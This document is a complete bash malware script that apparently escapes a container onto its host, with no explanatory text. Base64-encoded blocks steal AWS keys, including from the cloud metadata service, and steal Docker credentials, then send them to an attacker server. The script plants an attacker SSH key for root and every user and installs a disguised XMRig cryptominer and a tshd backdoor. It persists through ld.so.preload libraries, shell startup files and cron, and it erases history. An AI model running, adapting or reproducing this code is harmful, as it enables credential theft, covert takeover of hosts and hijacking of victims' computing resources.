#!/bin/bash
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export RUNSTR='CmV4cG9ydCBMRF9QUkVMT0FEPS91c3IvYmluL2Jhc2guc28KCm5vaHVwIC91c3Ivc2Jpbi9rdGhyZWFkZCA+L2Rldi9udWxsIDI+JjEgJgoKaGlzdG9yeSAtYyAyPiYxICYKCg=='
export STARTA='IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2FtZXMKZXhwb3J0IExEX1BSRUxPQUQ9L3Vzci9iaW4vYmFzaC5zbwpleHBvcnQgSE9NRT0vcm9vdApub2h1cCAvdXNyL3NiaW4va3RocmVhZGQgPi9kZXYvbnVsbCAyPiYxICYKbm9odXAgL3Vzci9zYmluL2tlcm5lbCA+L2Rldi9udWxsIDI+JjEgJgpjcm9udGFiIC1yCmlmIFsgLWYgIi92YXIvc3Bvb2wvY3Jvbi9jcm9udGFicy9yb290IiBdIDsgdGhlbiBybSAtZiAvdmFyL3Nwb29sL2Nyb24vY3JvbnRhYnMvcm9vdCAyPi9kZXYvbnVsbCA7IGZpCmlmIFsgLWYgIi92YXIvc3Bvb2wvY3Jvbi9yb290IiBdIDsgdGhlbiBybSAtZiAvdmFyL3Nwb29sL2Nyb24vcm9vdCAyPi9kZXYvbnVsbCA7IGZpCmlmIFsgLWYgIi92YXIvbWFpbC9yb290IiBdIDsgdGhlbiBybSAtZiAvdmFyL21haWwvcm9vdCAyPi9kZXYvbnVsbCA7IHRvdWNoIC92YXIvbWFpbC9yb290IDI+L2Rldi9udWxsIDsgZmkKaWYgWyAtZiAiL3Zhci9zcG9vbC9tYWlsL3Jvb3QiIF0gOyB0aGVuIHJtIC1mIC92YXIvc3Bvb2wvbWFpbC9yb290IDI+L2Rldi9udWxsIDsgdG91Y2ggL3Zhci9zcG9vbC9tYWlsL3Jvb3QgMj4vZGV2L251bGwgOyBmaQpoaXN0b3J5IC1jIDI+JjEgJgppZiBbIC1mICIvdmFyL3RtcC8uaW5pdCIgXSA7IHRoZW4gcm0gLWYgL3Zhci90bXAvLmluaXQgMj4vZGV2L251bGwgOyBmaQoK'
export CRONDT='IyBETyBOT1QgRURJVCBUSElTIEZJTEUgLSBlZGl0IHRoZSBtYXN0ZXIgYW5kIHJlaW5zdGFsbC4KIyAoLSBpbnN0YWxsZWQgb24gU3VuIEphbiAgMyAwMTo0MDozNiAyMDIxKQojIChDcm9uIHZlcnNpb24gLS0gJElkOiBjcm9udGFiLmMsdiAyLjEzIDE5OTQvMDEvMTcgMDM6MjA6Mzcgdml4aWUgRXhwICQpCiogKiAqICogKiBjYXQgL3Zhci90bXAvLmluaXQgfCBiYXNoIDsgY3JvbnRhYiAtcgo='
export PUBKEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ== root@localhost'
$(curl -sLk https://iplogger.org/1aaay7 -o /dev/null) &

function init_main(){
if ! [ -d "/dev/shm/.../...BORG.../" ] ; then mkdir -p /dev/shm/.../...BORG.../ ; fi
cat /etc/ld.so.preload 2>/dev/null | grep '/usr/local/lib/python2.7.so' 2>/dev/null 1>/dev/null || echo '/usr/local/lib/python2.7.so' >> /etc/ld.so.preload
cat /etc/ld.so.preload 2>/dev/null | grep '/usr/local/lib/python3.6.so' 2>/dev/null 1>/dev/null || echo '/usr/local/lib/python3.6.so' >> /etc/ld.so.preload
grabb_data
host_rsakey
setup_xmr
keep_alive
setup_tshd
/root/xmrigDaemon
}

function grabb_data(){
echo IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2FtZXMKQk9SR19LVUJFPSJodHRwOi8vdGhlLmJvcmcud3RmIgoKZG93bmxvYWQoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwgIiR7MS8vIi8iLyB9IgogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKICBleGVjIDM8Pi9kZXYvdGNwLyR7SE9TVH0vJFBPUlQKICBlY2hvIC1lbiAiR0VUICR7RE9DfSBIVFRQLzEuMFxyXG5Ib3N0OiAke0hPU1R9XHJcblxyXG4iID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDsgZG8gCiAgICAgIFtbICIkbGluZSIgPT0gJCdccicgXV0gJiYgYnJlYWsKICBkb25lIDwmMwogIG51bD0nXDAnCiAgd2hpbGUgSUZTPSByZWFkIC1kICcnIC1yIHggfHwgeyBudWw9IiI7IFsgLW4gIiR4IiBdOyB9OyBkbyAKICAgICAgcHJpbnRmICIlcyRudWwiICIkeCIKICBkb25lIDwmMwogIGV4ZWMgMz4mLQp9CgpjaGF0dHIgLWlhIC8gL3Zhci8gL3Zhci90bXAvIDI+L2Rldi9udWxsCmlmICEgWyAtZCAiL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vIiBdIDsgdGhlbiBta2RpciAtcCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi8gMj4vZGV2L251bGwgOyBmaQppZiB0eXBlIGF3cyAyPi9kZXYvbnVsbCAxPi9kZXYvbnVsbDsgdGhlbiBhd3MgY29uZmlndXJlIGxpc3QgPj4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0IDsgZmkKZW52IHwgZ3JlcCAnQVdTXHxhd3MnID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dAoKY2F0IC9ob3N0L3Jvb3QvLmF3cy8qID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dApjYXQgL2hvc3QvaG9tZS8qLy5hd3MvKiA+PiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9BV1NfZGF0YS50eHQKCmRvd25sb2FkIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvID4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vaWFtLnJvbGUKaWFtX3JvbGVfbmFtZT0kKGNhdCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9pYW0ucm9sZSkKcm0gLWYgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vaWFtLnJvbGUgMj4vZGV2L251bGwKZG93bmxvYWQgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8ke2lhbV9yb2xlX25hbWV9ID4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vYXdzLnRtcC5rZXkKY2F0IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2F3cy50bXAua2V5ID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dApybSAtZiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9hd3MudG1wLmtleQoKaWYgISBbIC16ICIkQVdTX0NPTlRBSU5FUl9DUkVERU5USUFMU19SRUxBVElWRV9VUkkiIF0gOyB0aGVuIGRvd25sb2FkIGh0dHA6Ly8xNjkuMjU0LjE3MC4yJEFXU19DT05UQUlORVJfQ1JFREVOVElBTFNfUkVMQVRJVkVfVVJJID4gL3Zhci90bXAvLi4uYi5hc2NlcwpjYXQgL3Zhci90bXAvLi4uYi5hc2NlcyB8IHB5dGhvbiAtbSBqc29uLnRvb2wgPj4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0IDsgcm0gLWYgL3Zhci90bXAvLi4uYi5hc2NlcyA7IGZpCgpjYXQgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vQVdTX2RhdGEudHh0IHwgZ3JlcCAnYWNjZXNzX2tleVx8c2VjcmV0X2tleVx8cmVnaW9uXHxhd3NfYWNjZXNzX2tleV9pZFx8YXdzX3NlY3JldF9hY2Nlc3Nfa2V5XHxMYXN0VXBkYXRlZFx8QWNjZXNzS2V5SWRcfFNlY3JldEFjY2Vzc0tleVx8VG9rZW5cfEV4cGlyYXRpb24nID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19LZXkudHh0CnJtIC1mIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19kYXRhLnR4dCAyPi9kZXYvbnVsbApmaW5kIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uLyAtc2l6ZSAwIC1leGVjIHJtIHt9IFw7IDI+L2Rldi9udWxsCgppZiBbIC1mICIvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9BV1NfS2V5LnR4dCIgXSA7IHRoZW4KaWYgISB0eXBlIGN1cmwgMj4vZGV2L251bGwgMT4vZGV2L251bGw7IHRoZW4gZG93bmxvYWQgaHR0cDovL3RoZS5ib3JnLnd0Zi9vdXRnb2luZy9iaW5hcnlfZmlsZXMvc3lzdGVtL2N1cmwgPiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9jdXJsCmNobW9kICt4IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2N1cmwgOyAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9jdXJsIC1GICJ1c2VyZmlsZT1AL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vQVdTX0tleS50eHQiICJodHRwOi8vdGhlLmJvcmcud3RmL2luY29taW5nL2FjY2Vzc19kYXRhL2F3cy5waHAiCmVsc2UgY3VybCAtRiAidXNlcmZpbGU9QC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19LZXkudHh0IiAiaHR0cDovL3RoZS5ib3JnLnd0Zi9pbmNvbWluZy9hY2Nlc3NfZGF0YS9hd3MucGhwIiA7IGZpCmNhdCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9BV1NfS2V5LnR4dCB8IGdyZXAgJ2FjY2Vzc19rZXlcfHNlY3JldF9rZXlcfHJlZ2lvblx8YXdzX2FjY2Vzc19rZXlfaWRcfGF3c19zZWNyZXRfYWNjZXNzX2tleVx8TGFzdFVwZGF0ZWRcfEFjY2Vzc0tleUlkXHxTZWNyZXRBY2Nlc3NLZXlcfEV4cGlyYXRpb24nCnJtIC1mIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0FXU19LZXkudHh0IDI+L2Rldi9udWxsIDsgZmkKCmhpc3RvcnkgLWMKCg== | base64 -d | bash
echo IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUKZXhwb3J0IEhPTUU9L3Jvb3QKZXhwb3J0IExDX0FMTD1DCmV4cG9ydCBQQVRIPSRQQVRIOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbjovdXNyL2dhbWVzOi91c3IvbG9jYWwvZ2FtZXMKaWYgISBbIC1kICIvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi8iIF0gOyB0aGVuIG1rZGlyIC1wIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uLyA7IGZpCgpkb3dubG9hZCgpIHsKICByZWFkIHByb3RvIHNlcnZlciBwYXRoIDw8PCAiJHsxLy8iLyIvIH0iCiAgRE9DPS8ke3BhdGgvLyAvL30KICBIT1NUPSR7c2VydmVyLy86Kn0KICBQT1JUPSR7c2VydmVyLy8qOn0KICBbWyB4IiR7SE9TVH0iID09IHgiJHtQT1JUfSIgXV0gJiYgUE9SVD04MAogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJHRVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgd2hpbGUgSUZTPSByZWFkIC1yIGxpbmUgOyBkbyAKICAgICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmUgPCYzCiAgbnVsPSdcMCcKICB3aGlsZSBJRlM9IHJlYWQgLWQgJycgLXIgeCB8fCB7IG51bD0iIjsgWyAtbiAiJHgiIF07IH07IGRvIAogICAgICBwcmludGYgIiVzJG51bCIgIiR4IgogIGRvbmUgPCYzCiAgZXhlYyAzPiYtCn0KCgppZiBbIC1mICIvaG9zdC9yb290Ly5kb2NrZXIvY29uZmlnLmpzb24iIF0gOyB0aGVuCmVjaG8gJ2RvY2tlciBkYXRhIHJvb3QnID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0dSQUJkb2NrZXIuZGF0CmVjaG8gJ35+fn5+fn5+fn5+fn5+fn4nID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0dSQUJkb2NrZXIuZGF0CmNhdCAvaG9zdC9yb290Ly5kb2NrZXIvY29uZmlnLmpzb24gPj4gL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vR1JBQmRvY2tlci5kYXQKZmkKCmxzIC0xIC9ob3N0L2hvbWUvID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL1RVU0VSLmRhdAp3aGlsZSByZWFkIFRVU0VSCmRvCmlmICEgWyAteiAiJFRVU0VSIiBdIDsgdGhlbiAKaWYgWyAtZiAiL2hvc3QvaG9tZS8kVFVTRVIvLmRvY2tlci9jb25maWcuanNvbiIgXSA7IHRoZW4KZWNobyAnZG9ja2VyIGRhdGEgJFRVU0VSJyA+PiAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9HUkFCZG9ja2VyLmRhdAplY2hvICd+fn5+fn5+fn5+fn5+fn5+fn4nID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0dSQUJkb2NrZXIuZGF0CmNhdCAvaG9zdC9ob21lLyRUVVNFUi8uZG9ja2VyL2NvbmZpZy5qc29uID4+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0dSQUJkb2NrZXIuZGF0CmZpCmZpCmRvbmUgPCAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9UVVNFUi5kYXQKcm0gLWYgL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vVFVTRVIuZGF0CgoKaWYgWyAtZiAiL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vR1JBQmRvY2tlci5kYXQiIF0gOyB0aGVuCmlmICEgdHlwZSBjdXJsIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsOyB0aGVuCmN1cmwgLUYgInVzZXJmaWxlPUAvZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9HUkFCZG9ja2VyLmRhdCIgImh0dHA6Ly90aGUuYm9yZy53dGYvaW5jb21pbmcvYWNjZXNzX2RhdGEvZG9ja2VyLnBocCIKZWxzZQpkb3dubG9hZCBodHRwOi8vdGhlLmJvcmcud3RmL291dGdvaW5nL2JpbmFyeV9maWxlcy9zeXN0ZW0vY3VybCA+IC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL2N1cmwKY2htb2QgK3ggL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vY3VybAovZGV2L3NobS8uLi4vLi4uQk9SRy4uLi9jdXJsIC1GICJ1c2VyZmlsZT1AL2Rldi9zaG0vLi4uLy4uLkJPUkcuLi4vR1JBQmRvY2tlci5kYXQiICJodHRwOi8vdGhlLmJvcmcud3RmL2luY29taW5nL2FjY2Vzc19kYXRhL2RvY2tlci5waHAiCmZpCnJtIC1mIC9kZXYvc2htLy4uLi8uLi5CT1JHLi4uL0dSQUJkb2NrZXIuZGF0IDI+L2Rldi9udWxsCmZpCgoK | base64 -d | bash
}

function host_rsakey(){
if ! [ -d "/host/root/.ssh" ] ; then chattr -ia /host/ /host/root/ 2>/dev/null ; mkdir -p /host/root/.ssh/ ; fi
chattr -R -ia /host/root/.ssh/ 2>/dev/null
echo $PUBKEY >> /host/root/.ssh/authorized_keys
echo $PUBKEY > /host/root/.ssh/authorized_keys2
chattr +a /host/root/.ssh/authorized_keys
chattr +i /host/root/.ssh/authorized_keys2

ls -1 /host/home/ >> /dev/shm/.../...BORG.../TUSER.dat
while read TUSER ; do
if ! [ -z "$TUSER" ] ; then 
if ! [ -d "/host/home/$TUSER/.ssh" ] ; then chattr -ia /host/ /host/home/ /host/home/$TUSER/ 2>/dev/null ; mkdir -p /host/home/$TUSER/.ssh/ 2>/dev/null ; fi
chattr -R -ia /host/home/$TUSER/.ssh/ 2>/dev/null
echo $PUBKEY >> /host/home/$TUSER/.ssh/authorized_keys
echo $PUBKEY > /host/home/$TUSER/.ssh/authorized_keys2
chattr +a /host/home/$TUSER/.ssh/authorized_keys2 2>/dev/null
chattr +i /host/home/$TUSER/.ssh/authorized_keys2 2>/dev/null
fi
done < /dev/shm/.../...BORG.../TUSER.dat
rm -f /dev/shm/.../...BORG.../TUSER.dat 2>/dev/null
}

function setup_xmr(){
chattr -ia /host/ /host/usr/ /host/usr/sbin/ 2>/dev/null
if ! [ -f "/host/usr/sbin/kthreadd" ] ; then cp /root/xmrigDaemon /host/usr/sbin/kthreadd ; chmod +x /host/usr/sbin/kthreadd ; fi
if ! [ -f "/host/usr/sbin/xmrigMiner" ] ; then cp /root/xmrigMiner /host/usr/sbin/xmrigMiner ; chmod +x /host/usr/sbin/xmrigMiner ; fi

chattr -ia /host/ /host/usr/ /host/usr/local/ 2>/dev/null 
if ! [ -d "/host/usr/local/lib" ] ; then mkdir -p /host/usr/local/lib/ 2>/dev/null ; fi
chattr -R -ia /host/usr/local/lib/ 2>/dev/null

if [ -f "/host/usr/local/lib/python2.7.so" ] ; then rm -f /host/usr/local/lib/python2.7.so 2>/dev/null ; cp /usr/local/lib/python2.7.so /host/usr/local/lib/python2.7.so
else cp /usr/local/lib/python2.7.so /host/usr/local/lib/python2.7.so ; fi

if [ -f "/host/usr/local/lib/python3.6.so" ] ; then rm -f /host/usr/local/lib/python3.6.so 2>/dev/null ; cp /usr/local/lib/python3.6.so /host/usr/local/lib/python3.6.so
else cp /usr/local/lib/python3.6.so /host/usr/local/lib/python3.6.so ; fi

chattr -ia /host/ /host/usr/ /host/usr/bin/ /host/usr/bin/bash.so 2>/dev/null
if [ -f "/host/usr/bin/bash.so" ] ; then rm -f /host/usr/bin/bash.so 2>/dev/null ; cp /usr/local/lib/python3.6.so /host/usr/bin/bash.so
else cp /usr/local/lib/python3.6.so /host/usr/bin/bash.so ; fi

chattr -ia /host/ /host/etc/ /host/etc/ld.so.preload 2>/dev/null
if [ -f "/host/etc/ld.so.preload" ] ; then rm -f /host/etc/ld.so.preload 2>/dev/null ; fi

cat /host/etc/ld.so.preload 2>/dev/null | grep '/usr/local/lib/python2.7.so' 2>/dev/null 1>/dev/null || echo '/usr/local/lib/python2.7.so' >> /host/etc/ld.so.preload
cat /host/etc/ld.so.preload 2>/dev/null | grep '/usr/local/lib/python3.6.so' 2>/dev/null 1>/dev/null || echo '/usr/local/lib/python3.6.so' >> /host/etc/ld.so.preload


}

function keep_alive(){
if [ -f "/host/root/.bashrc" ] ; then chattr -ia / /host/ /host/root/ /host/root/.bashrc 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/root/.bashrc ; fi
if [ -f "/host/root/.bash_login" ] ; then chattr -ia / /host/ /host/root/ /host/root/.bash_login 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/root/.bash_login ; fi
if [ -f "/host/root/.bash_profile" ] ; then chattr -ia / /host/ /host/root/ /host/root/.bash_profile 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/root/.bash_profile ; fi
ls -1 /host/home/ >> /dev/shm/.../...BORG.../TUSER.dat
while read TUSER ; do
if ! [ -z "$TUSER" ] ; then 
if [ -f "/host/home/$TUSER/.bashrc" ] ; then chattr -ia / /host/ /host/home/ /host/home/$TUSER/ /host/home/$TUSER/.bashrc 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/home/$TUSER/.bashrc ; fi
if [ -f "/host/home/$TUSER/.bash_login" ] ; then chattr -ia / /host/ /host/home/ /host/home/$TUSER/ /host/home/$TUSER/.bash_login 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/home/$TUSER/.bash_login ; fi
if [ -f "/host/home/$TUSER/.bash_profile" ] ; then chattr -ia / /host/ /host/home/ /host/home/$TUSER/ /host/home/$TUSER/.bash_profile 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/home/$TUSER/.bash_profile ; fi
if [ -f "/host/etc/bash.bashrc" ]; then chattr -ia /host/ /host/etc/ /host/etc/bash.bashrc 2>/dev/null ; echo $RUNSTR | base64 -d >> /host/etc/bash.bashrc ; fi
if [ -d "/host/etc/profile.d" ]; then
for i in /host/etc/profile.d/*.sh ; do
if ! [ -z "$i" ] ; then 
chattr -ia $i 2>/dev/null
echo $RUNSTR | base64 -d >> $i ; done
unset i
fi ; fi ; fi
done < /dev/shm/.../...BORG.../TUSER.dat
rm -f /dev/shm/.../...BORG.../TUSER.dat
}

function cleanup_startjob(){
if [ -f "/host/var/spool/cron/crontabs/root" ] ; then rm -f /host/var/spool/cron/crontabs/root 2>/dev/null ; fi
if [ -f "/host/var/spool/cron/root" ] ; then rm -f /host/var/spool/cron/root 2>/dev/null ; fi
if [ -f "/host/var/tmp/.init" ] ; then rm -f /host/var/tmp/.init 2>/dev/null ; fi
}

function makeshift_start(){
chmod +x /host/usr/sbin/kernel 2>/dev/null
nohup /host/usr/sbin/kernel >/dev/null 2>&1 &
chmod +x /host/usr/sbin/kthreadd 2>/dev/null
nohup /host/usr/sbin/kthreadd >/dev/null 2>&1 &
}

function setup_tshd(){
chattr -ia /host/ /host/usr/ /host/usr/sbin/ 2>/dev/null
if ! [ -f "/host/usr/sbin/kernel" ] ; then cp /root/tshd /host/usr/sbin/kernel ; chmod +x /host/usr/sbin/kernel ; fi
	chattr -ia /host/ /host/var/ /host/var/tmp/ 2>/dev/null ; chattr -R -ia /host/var/tmp/ 2>/dev/null
	if [ -f "/host/var/tmp/.init" ] ; then chattr -ia /host/var/tmp/.init 2>/dev/null ; rm -f /host/var/tmp/.init 2>/dev/null ; echo $STARTA | base64 -d > /host/var/tmp/.init ; chmod +x /host/var/tmp/.init 2>/dev/null
	else echo $STARTA | base64 -d > /host/var/tmp/.init ; chmod +x /host/var/tmp/.init 2>/dev/null ; fi

chattr -ia /host/ /host/var/ /host/var/spool/ /host/var/spool/cron/ /host/var/spool/cron/crontabs/ 2>/dev/null ; chattr -R -ia /host/var/spool/cron/ 2>/dev/null
rm -fr /host/var/spool/cron/ 2>/dev/null ; mkdir -p /host/var/spool/cron/crontabs/ 2>/dev/null
if [ -f "/host/var/spool/cron/crontabs/root" ] ; then rm -f /host/var/spool/cron/crontabs/root 2>/dev/null ; fi
if [ -f "/host/var/spool/cron/root" ] ; then rm -f /host/var/spool/cron/root 2>/dev/null ; fi
	echo $CRONDT >> /host/var/spool/cron/root ; chmod +x /host/var/spool/cron/root 2>/dev/null
	echo $CRONDT >> /host/var/spool/cron/crontabs/root ; chmod +x /host/var/spool/cron/crontabs/root 2>/dev/null

sleep 50s # 0a04d173a4cbd6b666adde0f2dd1dfac
if ! [ -f "/host/var/spool/cron/crontabs/root" ] ; then if [ -f "/host/var/tmp/.init" ] ; then sleep 20s ;fi
if [ -f "/host/var/tmp/.init" ] ; then cleanup_startjob ; makeshift_start ; fi ; fi
	if ! [ -f "/host/var/spool/cron/root" ] ; then if [ -f "/host/var/tmp/.init" ] ; then sleep 20s ;fi
	if [ -f "/host/var/tmp/.init" ] ; then cleanup_startjob ; makeshift_start ; fi ; fi
		if [ -f "/host/var/tmp/.init" ] ; then cleanup_startjob ; makeshift_start ; fi 
}


init_main

